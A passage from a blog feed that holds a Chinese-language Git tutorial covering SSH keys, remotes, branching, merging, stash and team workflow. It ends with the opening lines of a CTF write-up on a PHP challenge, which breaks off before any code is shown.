href="#1-创建SSH-Key" class="headerlink" title="1.创建SSH Key"></a>1.创建SSH Key</h4><blockquote><p>在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"youremail@example.com"</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果一切顺利的话，可以在用户主目录里找到<code>.ssh</code>目录，里面有<code>id_rsa</code>和<code>id_rsa.pub</code>两个文件，这两个就是SSH Key的秘钥对，<code>id_rsa</code>是私钥，不能泄露出去，<code>id_rsa.pub</code>是公钥，可以放心地告诉任何人。</p></blockquote><h4 id="2-登陆GitHub"><a href="#2-登陆GitHub" class="headerlink" title="2.登陆GitHub"></a>2.登陆GitHub</h4><blockquote><p>打开“Account settings”，“SSH Keys”页面，然后点“Add SSH Key”，填上任意Title，在Key文本框里粘贴<code>id_rsa.pub</code>文件的内容：</p></blockquote><p><img src="/images/143-2.png" alt></p><h4 id="3-添加远程库"><a href="#3-添加远程库" class="headerlink" title="3.添加远程库"></a>3.添加远程库</h4><p><code>情景</code></p><blockquote><p>已经在本地创建了一个Git仓库后，又想在GitHub创建一个Git仓库，并且让这两个仓库进行远程同步，这样，GitHub上的仓库既可以作为备份，又可以让其他人通过该仓库来协作，真是一举多得。</p></blockquote><p><code>第一步</code></p><blockquote><p>首先，登陆GitHub，然后，在右上角找到“Create a new repo”按钮，创建一个新的仓库</p></blockquote><p><code>第二步</code></p><blockquote><p>在Repository name填入<code>learngit</code>，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的Git仓库</p></blockquote><p><code>第三步</code></p><blockquote><p>将本地git仓库和远程的github仓库关联起来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin <span class="string">" Your Github address"</span></span></span><br></pre></td></tr></table></figure><p><code>第四步</code></p><blockquote><p>把本地仓库的所有内容推送到远程库上</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br></pre></td></tr></table></figure><blockquote><p>把本地库的内容推送到远程，用<code>git push</code>命令，实际上是把当前分支<code>master</code>推送到远程。</p><p>由于远程库是空的，我们<strong>第一次推送<code>master</code>分支时，加上了<code>-u</code>参数</strong>，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><p>此后，每次本地提交后，只要有必要，就可以使用命令<code>git push origin master</code>推送最新修改；</p></blockquote><h4 id="4-从远程仓库克隆"><a href="#4-从远程仓库克隆" class="headerlink" title="4.从远程仓库克隆"></a>4.从远程仓库克隆</h4><p><code>克隆一个本地库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git@<span class="string">"github address"</span></span></span><br></pre></td></tr></table></figure><h4 id="5-创建与合并分支"><a href="#5-创建与合并分支" class="headerlink" title="5.创建与合并分支"></a>5.创建与合并分支</h4><blockquote><p><code>HEAD</code>严格来说不是指向提交，而是指向<code>master</code>，<code>master</code>才是指向提交的，所以，<code>HEAD</code>指向的就是当前分支。一开始的时候，<code>master</code>分支是一条线，Git用<code>master</code>指向最新的提交，再用<code>HEAD</code>指向<code>master</code>，就能确定当前分支，以及当前分支的提交点：</p></blockquote><p><img src="/images/143-3.png" alt></p><blockquote><p>每次提交，<code>master</code>分支都会向前移动一步，这样，随着你不断提交，<code>master</code>分支的线也越来越长。</p><p>当我们创建新的分支，例如<code>dev</code>时，Git新建了一个指针叫<code>dev</code>，指向<code>master</code>相同的提交，再把<code>HEAD</code>指向<code>dev</code>，就表示当前分支在<code>dev</code>上：</p></blockquote><p><img src="/images/143-4.png" alt></p><blockquote><p>Git创建一个分支很快，因为除了增加一个<code>dev</code>指针，改改<code>HEAD</code>的指向，工作区的文件都没有任何变化！</p><p>不过，从现在开始，对工作区的修改和提交就是针对<code>dev</code>分支了，比如新提交一次后，<code>dev</code>指针往前移动一步，而<code>master</code>指针不变：</p></blockquote><p><img src="/images/143-5.png" alt></p><blockquote><p>假如我们在<code>dev</code>上的工作完成了，就可以把<code>dev</code>合并到<code>master</code>上。Git怎么合并呢？最简单的方法，就是直接把<code>master</code>指向<code>dev</code>的当前提交，就完成了合并：</p></blockquote><p><img src="/images/143-6.png" alt></p><blockquote><p>所以Git合并分支也很快！就改改指针，工作区内容也不变！</p><p>合并完分支后，甚至可以删除<code>dev</code>分支。删除<code>dev</code>分支就是把<code>dev</code>指针给删掉，删掉后，我们就剩下了一条<code>master</code>分支：</p></blockquote><p><img src="/images/143-7.png" alt></p><p><code>创建dev分支，然后切换dev分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b dev</span></span><br></pre></td></tr></table></figure><blockquote><p><code>git checkout</code>命令加上<code>-b</code>参数表示创建并切换，相当于以下两条命令：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev</span></span><br></pre></td></tr></table></figure><p><code>查看当前分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br></pre></td></tr></table></figure><p><code>把dev分支的工作成果合并到master分支上</code></p><blockquote><p>要先执行<code>git add &quot;fileName&quot;</code>和<code>git commit &quot;fileName&quot;</code>，才能进行合并</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br></pre></td></tr></table></figure><blockquote><p>注意到上面的<code>Fast-forward</code>信息，Git告诉我们，这次合并是“快进模式”，也就是直接把<code>master</code>指向<code>dev</code>的当前提交，所以合并速度非常快。如果<font color="red">合并分支时加上<code>--no-ff</code>参数：表示禁用<code>Fast forward</code></font>的区别：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge with no-ff"</span> dev</span></span><br></pre></td></tr></table></figure><blockquote><p>下图是加上该参数的情况</p></blockquote><p><img src="/images/143-8.png" alt></p><p><code>查看分支合并的情况</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --graph</span></span><br></pre></td></tr></table></figure><h4 id="6-删除分支"><a href="#6-删除分支" class="headerlink" title="6.删除分支"></a>6.删除分支</h4><p><code>删除分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br></pre></td></tr></table></figure><p><code>强行删除分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -D dev</span></span><br></pre></td></tr></table></figure><h4 id="7-解决冲突"><a href="#7-解决冲突" class="headerlink" title="7.解决冲突"></a>7.解决冲突</h4><blockquote><p>Git用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容，如下：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes of files.</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">Creating a new branch is quick &amp; simple.</span><br><span class="line">=======</span><br><span class="line">Creating a new branch is quick AND simple.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;&gt;&gt;&gt; feature1</span></span><br></pre></td></tr></table></figure><blockquote><p>我们修改如下后保存：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Creating a new branch is quick and simple.</span><br></pre></td></tr></table></figure><h4 id="8-分支策略"><a href="#8-分支策略" class="headerlink" title="8.分支策略"></a>8.分支策略</h4><blockquote><p>首先，<code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；那在哪干活呢？干活都在<code>dev</code>分支上，也就是说，<code>dev</code>分支是不稳定的，到某个时候，比如1.0版本发布时，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本；你和你的小伙伴们每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。所以，团队合作的分支看起来就像这样：</p></blockquote><p><img src="/images/143-9.png" alt></p><h4 id="9-Bug分支"><a href="#9-Bug分支" class="headerlink" title="9.Bug分支"></a>9.Bug分支</h4><p><code>储存当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br></pre></td></tr></table></figure><p><code>从当前分支上切换到存在Bug的分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branchName]</span></span><br></pre></td></tr></table></figure><p><code>创建Bug分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b issue-101</span></span><br></pre></td></tr></table></figure><p><code>修复Bug</code></p><p><code>从bug分支上切换到存在Bug的分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch [branchName]</span></span><br></pre></td></tr></table></figure><p><code>合并分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merged bug fix 101"</span> issue-101</span></span><br></pre></td></tr></table></figure><p><code>切换到干活的分支</code></p><p><code>查看当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br></pre></td></tr></table></figure><p><code>恢复当前分支的工作现场</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash apply</span></span><br></pre></td></tr></table></figure><blockquote><p>⇡ 恢复后，stash内容并不删除，你需要用<code>git stash drop</code>来删除；</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br></pre></td></tr></table></figure><blockquote><p>⇡ 恢复的同时把stash内容也删了</p></blockquote><p><code>在不同的分支上同步修改bug的操作</code></p><blockquote><p>比如我们在master分支上修复了bug，那么我们怎么同步到dev分支上呢？同样的bug，要在dev上修复，我们只需要把<code>4c805e2 fix bug 101</code>这个提交所做的修改“复制”到dev分支。注意：我们只想复制<code>4c805e2 fix bug 101</code>这个提交所做的修改，并不是把整个master分支merge过来。</p><p>为了方便操作，Git专门提供了一个<code>cherry-pick</code>命令，让我们能复制一个特定的提交到当前分支：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick 4c805e2(master的sha1值)</span></span><br></pre></td></tr></table></figure><h4 id="10-多人协作"><a href="#10-多人协作" class="headerlink" title="10.多人协作"></a>10.多人协作</h4><p><code>查看远程库信息</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote</span></span><br><span class="line">origin</span><br></pre></td></tr></table></figure><blockquote><p>用<code>git remote -v</code>显示更详细的信息</p></blockquote><p><code>推送分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push origin <span class="string">"branchName"</span></span></span><br></pre></td></tr></table></figure><ul><li><code>master</code>分支是主分支，因此要时刻与远程同步；</li><li><code>dev</code>分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步；</li><li><code>bug</code>分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug；</li><li><code>featur</code>e分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</li></ul><p><code>抓取分支</code></p><blockquote><p>首先要克隆一个仓库，如果A在修改文件后push到远程仓库后，你也要push到远程仓库，那么会收到如下信息：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat env.txt</span></span><br><span class="line">env</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add env.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"add new env"</span></span></span><br><span class="line">[dev 7bd91f1] add new env</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 env.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin dev</span></span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> ! [rejected]        dev -&gt; dev (non-fast-forward)</span><br><span class="line">error: failed to push some refs to 'git@github.com:michaelliao/learngit.git'</span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: 'git pull ...') before pushing again.</span><br><span class="line">hint: See the 'Note about fast-forwards' in 'git push --help' for details.</span><br></pre></td></tr></table></figure><blockquote><p>推送失败，因为你的小伙伴的最新提交和你试图推送的提交有冲突，解决办法也很简单，Git已经提示我们，先用<code>git pull</code>把最新的提交从<code>origin/dev</code>抓下来，然后，在本地合并，解决冲突，再推送：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">There is no tracking information for the current branch.</span><br><span class="line">Please specify which branch you want to merge with.</span><br><span class="line">See git-pull(1) for details.</span><br><span class="line"></span><br><span class="line">    git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"></span><br><span class="line">If you wish to set tracking information for this branch you can do so with:</span><br><span class="line"></span><br><span class="line">    git branch --set-upstream-to=origin/&lt;branch&gt; dev</span><br></pre></td></tr></table></figure><blockquote><p><code>git pull</code>也失败了，原因是没有指定本地<code>dev</code>分支与远程<code>origin/dev</code>分支的链接，根据提示，设置<code>dev</code>和<code>origin/dev</code>的链接：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch --<span class="built_in">set</span>-upstream-to=origin/dev dev</span></span><br><span class="line">Branch 'dev' set up to track remote branch 'dev' from 'origin'.</span><br></pre></td></tr></table></figure><blockquote><p>再pull：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">Auto-merging env.txt</span><br><span class="line">CONFLICT (add/add): Merge conflict in env.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure><blockquote><p>这回<code>git pull</code>成功，但是合并有冲突，需要手动解决，解决的方法和分支管理中的<a href="#### 7.解决冲突">解决冲突</a>完全一样。解决后，提交，再push：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"fix env conflict"</span></span></span><br><span class="line">[dev 57c53ab] fix env conflict</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin dev</span></span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (4/4), done.</span><br><span class="line">Writing objects: 100% (6/6), 621 bytes | 621.00 KiB/s, done.</span><br><span class="line">Total 6 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line">   7a5e5dd..57c53ab  dev -&gt; dev</span><br></pre></td></tr></table></figure><p>因此，多人协作的工作模式通常是这样：</p><ol><li>首先，可以试图用<code>git push origin &lt;branch-name&gt;</code>推送自己的修改；</li><li>如果推送失败，则因为远程分支比你的本地更新，需要先用<code>git pull</code>试图合并；</li><li>如果合并有冲突，则解决冲突，并在本地提交；</li><li>没有冲突或者解决掉冲突后，再用<code>git push origin &lt;branch-name&gt;</code>推送就能成功！</li></ol><p>如果<code>git pull</code>提示<code>no tracking information</code>，则说明本地分支和远程分支的链接关系没有创建，用命令<code>git branch --set-upstream-to &lt;branch-name&gt; origin/&lt;branch-name&gt;</code>。这就是多人协作的工作模式，一旦熟悉了，就非常简单。</p><h3 id="三、命令总结"><a href="#三、命令总结" class="headerlink" title="三、命令总结"></a>三、命令总结</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">`配置用户名`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"email@example.com"</span></span></span><br><span class="line"></span><br><span class="line">`初始化`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br><span class="line"></span><br><span class="line">`将文件添加到仓库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add fileName</span></span><br><span class="line"></span><br><span class="line">`将文件提交到仓库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"&lt;本次提交的说明&gt;"</span></span></span><br><span class="line"></span><br><span class="line">`查看当前仓库的状态`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line"></span><br><span class="line">`查看修改的内容`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git diff fileName</span></span><br><span class="line"></span><br><span class="line">`查看历史记录`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line"></span><br><span class="line">`版本回退`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^/SHA1-ID</span></span><br><span class="line"></span><br><span class="line">`查看每一次命令的信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br><span class="line"></span><br><span class="line">`丢弃工作区的修改`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- fileName</span></span><br><span class="line"></span><br><span class="line">`删除文件`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git rm test.txt</span></span><br><span class="line"></span><br><span class="line">`将本地仓库和远程仓库关联起来`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin <span class="string">"Your Github repository name"</span></span></span><br><span class="line"></span><br><span class="line">`查看远程库信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote</span></span><br><span class="line"></span><br><span class="line">`查看远程库详细信息`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git remote -v</span></span><br><span class="line"></span><br><span class="line">`将本地仓库的内容推送到远程库`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br><span class="line"></span><br><span class="line">`创建分支`+-----------------+</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch dev++</span></span><br><span class="line">+========== $ git checkout -b dev</span><br><span class="line">`切换分支`   ++</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev or $ git switch dev +-----------------+</span></span><br><span class="line"></span><br><span class="line">`查看当前分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch </span></span><br><span class="line"></span><br><span class="line">`将dev分支合并到当前分支（启用Fast forward）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br><span class="line"></span><br><span class="line">`将dev分支合并到当前分支（禁用Fast forward）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge with no-ff"</span> dev</span></span><br><span class="line"></span><br><span class="line">`查看分支合并的情况`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --graph</span></span><br><span class="line"></span><br><span class="line">`删除分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br><span class="line"></span><br><span class="line">`强行删除分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -D dev</span></span><br><span class="line"></span><br><span class="line">`储存当前分支的工作现场`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br><span class="line"></span><br><span class="line">`从当前分支上切换到存在Bug的分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout [branchName]</span></span><br><span class="line"></span><br><span class="line">`创建Bug分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b issue-101</span></span><br><span class="line"></span><br><span class="line">`修复Bug（手动修复）`</span><br><span class="line"></span><br><span class="line">`从bug分支上切换到存在Bug的分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch [branchName]</span></span><br><span class="line"></span><br><span class="line">`合并分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merged bug fix 101"</span> issue-101</span></span><br><span class="line"></span><br><span class="line">`切换到干活的分支`</span><br><span class="line"></span><br><span class="line">`查看当前分支的工作现场`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br><span class="line"></span><br><span class="line">`恢复当前分支的工作现场（stash内容并不删除）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash apply</span></span><br><span class="line"></span><br><span class="line">`恢复当前分支的工作现场（stash内容删除）`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br><span class="line"></span><br><span class="line">`在不同的分支上同步修改bug的操作`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git cherry-pick 4c805e2(master的sha1值)</span></span><br><span class="line"></span><br><span class="line">`推送分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push origin <span class="string">"branchName"</span></span></span><br><span class="line"></span><br><span class="line">`抓取分支`</span><br><span class="line"><span class="meta">$</span><span class="bash"> git pull</span></span><br><span class="line">等价于：git fetch   git merge &lt;Branch Name&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、Git-教程&quot;&gt;&lt;a href=&quot;#一、Git-教程&quot; class=&quot;headerlink&quot; title=&quot;一、Git 教程&quot;&gt;&lt;/a&gt;一、Git 教程&lt;/h3&gt;&lt;h4 id=&quot;1-Git-介绍&quot;&gt;&lt;a href=&quot;#1-Git-介绍&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP相关题目writeup（持续更新）</title>
    <link href="https://muzibing.github.io/2020/07/28/2020.07.28%EF%BC%88142%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/28/2020.07.28（142）/</id>
    <published>2020-07-27T16:00:00.000Z</published>
    <updated>2020-08-17T14:28:15.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-函数漏洞问题"><a href="#0x00-函数漏洞问题" class="headerlink" title="0x00 函数漏洞问题"></a><font color="navy"><code>0x00 函数漏洞问题</code></font></h2><h3 id="【Jarvois-OJ-web】BabyPHP"><a href="#【Jarvois-OJ-web】BabyPHP" class="headerlink" title="【Jarvois OJ-web】BabyPHP"></a><font color="blue"><code>【Jarvois OJ-web】BabyPHP</code></font></h3><h4 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><p><img src="/images/142-1.png" alt></p><h4 id="2-GIT-源码泄露"><a href="#2-GIT-源码泄露" class="headerlink" title="2.GIT 源码泄露"></a><code>2.GIT 源码泄露</code></h4><p>通过上图的提示，我们猜测是不是可以通过git泄露源码，从而进行得到php代码，有关GIT源码泄露的可以<a href="https://www.jianshu.com/p/edae09535ea3" target="_blank" rel="noopener">点击这里</a>，有关git的介绍可以<a href="https://muzibing.github.io/2020/07/29/2020.07.29（143）/">点击这里</a>，下面我们得到如下的文件及文件夹：</p><p><img src="/images/142-2.jpg" alt></p><h4 id="3-查看index-php源码"><a href="#3-查看index-php源码" class="headerlink" title="3.查看index.php源码"></a><code>3.查看index.php源码</code></h4><p>打开index.php源码，可以得到其中最为关键的一段代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span 